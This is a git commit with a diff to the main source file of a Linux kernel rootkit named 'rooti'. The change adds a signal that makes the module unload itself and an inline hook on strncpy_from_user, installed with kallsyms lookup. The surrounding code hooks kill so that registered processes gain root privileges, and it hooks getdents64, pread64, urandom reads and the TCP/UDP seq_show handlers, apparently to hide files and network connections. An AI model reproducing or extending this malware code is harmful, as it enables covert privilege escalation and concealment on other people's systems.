c433352e578dcb12ecfd213f1a37d0c7c95ae35d
Omri Ben Zikri <omribenzikri10@gmail.com>
2025-10-05 20:05:21 +0000

    Trying to hook strncpy_from_user for safe unloading

--- src/main.c
+++ src/main.c
@@ -14,6 +14,7 @@
 #include "capabilities/privilege.h"
 #include "capabilities/track.h"
 #include "capabilities/hide.h"
+#include "capabilities/unload.h"
 #include "utils.h"
 #include "config.h"
 
@@ -24,7 +25,8 @@ MODULE_VERSION("1.0.0");
 
 // Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signal {
-    ROOTI_SIG_REG = 64    // request by a usermode process to be serviced by the rootkit
+    ROOTI_SIG_UNLOAD = 63,  // make the rootkit self destruct by unloading itself
+    ROOTI_SIG_REG = 64      // request by a usermode process to be serviced by the rootkit
 };
 
 // Bitmap in which every bit represents the PID number of a registered client userspace process
@@ -59,6 +61,10 @@ static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *i
 static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
 
+// Reference to other kernel functions that are hooked
+static long (*orig_strncpy_from_user)(char *dst, const char __user *src, long count);
+
+
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
@@ -66,6 +72,11 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
         // Register the new process
         rooti_clients_bitmap[current->pid / 8] |= (1U << current->pid % 8);
         return rooti_elevate_privilege();
+    } 
+    else if (sig == ROOTI_SIG_UNLOAD) {
+        // Unload the rootkit
+        rooti_self_destruct();
+        return 0;
     }
     return orig_kill(regs);
 }
@@ -243,6 +254,18 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
     return len;
 }
 
+/*
+    This hook allows passing kernel space addresses to strncpy_from_user().
+    The reason this is needed is so we can call system call service routines directly from within
+    the kernel itself and avoid a panic whenever we pass a pointer to a kernel buffer to the service routine.
+    Hooks for copy_to_user() and copy_from_user() are currently not needed but may be in the future.
+*/
+static long hook_strncpy_from_user(char *dst, const char __user *src, long count)
+{
+    ROOTI_DEBUG("strncpy_from_user called - addr is %lx", (unsigned long)src);
+    return orig_strncpy_from_user(dst, src, count);
+}
+
 // List of system calls to hook :D
 struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
@@ -254,6 +277,8 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64)
 };
+
+struct rooti_func_hook test_hook = ROOTI_FUNC_HOOK("strncpy_from_user", hook_strncpy_from_user, &orig_strncpy_from_user);
 
 /* LKM initialization */
 static int __init rooti_init(void)
@@ -273,6 +298,9 @@ static int __init rooti_init(void)
         ROOTI_DEBUG("rooti_install_hooks() failed: %d", ret);
         return ret;
     }
+
+    test_hook.addr = __kallsyms_lookup_name(test_hook.name);
+    rooti_install_inline_hook(&test_hook);
 
     // Patch some operation structures function pointers. You could just hook the callbacks
     // themselves but I wanted to try patching kernel objects directly in memory.
@@ -315,6 +343,8 @@ static void __exit rooti_exit(void)
     ROOTI_DEBUG("exit");
 
     rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
+
+    rooti_uninstall_inline_hook(&test_hook);
 
     // Restore kernel structures to their original form
     struct file_operations *random_file_ops = (struct file_operations *)__kallsyms_lookup_name("random_fops");
